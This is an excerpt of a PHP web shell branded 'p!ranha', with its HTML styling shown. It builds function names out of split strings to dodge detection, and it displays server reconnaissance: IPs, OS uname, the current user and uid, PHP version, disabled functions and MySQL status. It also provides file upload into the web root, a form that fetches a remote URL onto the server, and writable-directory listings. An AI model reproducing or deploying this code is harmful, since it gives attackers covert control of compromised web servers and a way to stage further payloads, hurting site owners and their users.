...
<html>
<head>
	<meta name="author" content="p!ranha by3p4ss">
	<meta name="robots" content="noindex, nofollow, noarchive">
	<meta name="viewport" content="width=device-width, initial-scale=0.1">
	<link rel="icon" href="https://i.ibb.co/g68BBXn/piranha.png" type="image/x-icon">
	<title>p!ranha?</title>
</head>
<body bgcolor="#580f0f" text="#ffffff">
...
body {
	...
	text-shadow:0px 0px 1px #ba2c1c;
...
if (empty($disfunc)) {
	$disf = "<font color='#ff1818'>NONE</font>";
} else {
...
function cekdir() {
	...
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($lokasi)) {
		return "<font color='#009c12'>Writeable</font>";
	} else {
...
function memeklim($text) {
	echo "<center><font color='#009c12'>".$text."</center></font>";
}
...
echo "Se"."rv"."er"." I"."P : <font color=#ff1818>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=#ff1818>".$_SERVER[$rad]."</font><br>";
echo "We"."b S"."erv"."er : <font color='#ff1818'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
$unm = "ph"."p_u"."na"."me";
echo "Sys"."tem : <font color='#ff1818'>".@$unm()."</font><br>";
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo "Us"."er : <font color='#ff1818'>".@$gcu()."&nbsp;</font>( <font color='#ff1818'>".@$gmu()."</font>)<br>";
$phv = "ph"."pve"."rsi"."on";
echo "PH"."P V"."er"."sio"."n : <font color='#ff1818'>".@$phv()."</font><br>";
echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
echo "MySQL : ";
if (@$fnct("my"."sql_co"."nne"."ct")) {
    echo "<font color=#009c12>ON</font>";
} else {
		...
		if (empty($_FILES['berkas']['name'])) {
			...
			$data = @$fpt($lokasi."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
				if ($fxt($lokasi."/".$_FILES['berkas']['name'])) {
					...
					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='#ff1818'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='#ff1818'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
		...
		if (empty($_POST['namalink'])) {
			...
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
				...
				if ($fxt($lokasi."/".$_POST['namalink'])) {
					...
					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='#ff1818'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='#ff1818'>".$lwb."</font></a><br>";
					}
...
<input type="text" name="darilink" class="up" size="59" placeholder="https://pir'.'an'.'ha'.'.go'.'.id'.'/ev'.'il'.'66'.'6k'.'ids">&nbsp;<input type="text" name="namalink" class="up" size="14" placeholder="sa'.'ved.'.'txt"><input type="submit" name="linknya" class="up" value="G'.'0!" style="cursor: pointer; border-color: #fff">
...
<td><center>";
if($isw($euybrekw)) echo '<font color="#009c12">';
...
foreach($lokasinya as $ppkcina){
	...
	<td><center>";
	if($isw($euybre)) echo '<font color="#009c12">';
...
<td><center>";
if($isw("$lokasi/$mekicina")) echo '<font color="#009c12">';
